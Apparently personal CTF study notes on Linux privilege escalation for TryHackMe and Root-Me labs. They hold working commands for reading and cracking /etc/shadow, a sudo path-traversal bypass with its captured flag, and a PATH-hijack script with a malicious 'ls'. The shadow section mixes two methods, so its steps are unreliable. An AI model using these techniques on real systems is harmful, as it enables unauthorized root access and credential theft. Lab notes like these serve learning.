Look at this [THM course](https://tryhackme.com/room/linuxprivesc) to learn more

### Useful Commands

- ```hostname``` : returns the hostname of the target machine
- ```uname -a``` : prints system information
- ```cat /proc/version```: gives information on the kernel version or what compiler was used to create it
- ```cat /etc/issue```: gives information about the operation system but can easily be changed of customized
- ```ps``` : shows the running processes (```aux``` option shows processes for all users and ```axjf``` option shows processes from all users)
- ```cron``` service : time-based job scheduler to schedule commands or scripts to run automatically at specified intervals (check ```/etc/crontab```, ```/var/spool/cron``` or ```etc/cron.d```)
- ```dpkg -l``` : lists all installed packages and their version
- ```id``` : provides a general overview of the user's  privilege level and group memberships
- ```env``` : shows environmental variables
- ```history``` : shows the terminal history
- ```sudo -l``` : shows some commands user is available to run with root privileges
- ```/etc/passwd``` file : shows users on the system
- ```ifconfig``` : gives information about the network interfaces of the system
- ```netstat``` service : look at the [[Linux Modules]] page

The ```/etc/shadow``` file contains user password hashes and is usually readable only by the root user.

Then you can use the tool *John The Ripper* to find the passwords and log into the root using to get the root's privileges. 

###### Protocol

On a VM, the ```/etc/shadow``` file is world-writable :

```bash
ls -l /etc/shadow
```

Generate a new password hash with a password of your choice :

```bash
mkpasswd -m sha-512 <newpassword>
```

Save the root's password into a file (e.g "file.txt")

Use *John The Ripper* to find the root password :

```bash
john --wordlist=SecLists/Passwords/Leaked-Databases/rockyou.txt file.txt
```

Then switch to the root user, using the new password :

```bash
su root
```

You can use ```sudo -l``` to list the processes and try to find a process that doesn't have a shell escape sequence (check the website [GTFOBins](https://gtfobins.org/)) 

### Privileges escalation

If you can use sudo but get this error using it :

```bash
Sorry, user app-script-ch1 is not allowed to execute '/bin/cat ch1cracked/.passwd' as root on challenge02.root-me.org.
```

It means sudo has a rule you can find using :

```bash
sudo -l
```

If the user ```app-script-ch1-cracked``` is allowed to execute the command (that you see with the previous command) :

```bash
User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*

```

You can access the file using :

```bash
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/ch1cracked/.passwd
Sorry, user app-script-ch1 is not allowed to execute '/bin/cat /challenge/app-script/ch1/ch1cracked/.passwd' as app-script-ch1-cracked on challenge02.root-me.org.
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
b3_c4r3ful_w1th_sud0
```

##### IMPORTANT - METHOD
```shell
# 1. create a directory you own, with a name unlikely to collide
mkdir -p /tmp/ch12_$$  
cd /tmp/ch12_$$

# 2. write the malicious "ls" inside YOUR directory
cat > ls << 'EOF'
#!/bin/bash
cat /challenge/app-script/ch12/.passwd
EOF
chmod +x ls

# 3. confirm it's yours and executable
ls -la ls

# 4. prepend YOUR dir to PATH
export PATH=/tmp/ch12_$$:$PATH
echo $PATH

# 5. go back home and trigger the SUID binary
cd ~
./ch12
```
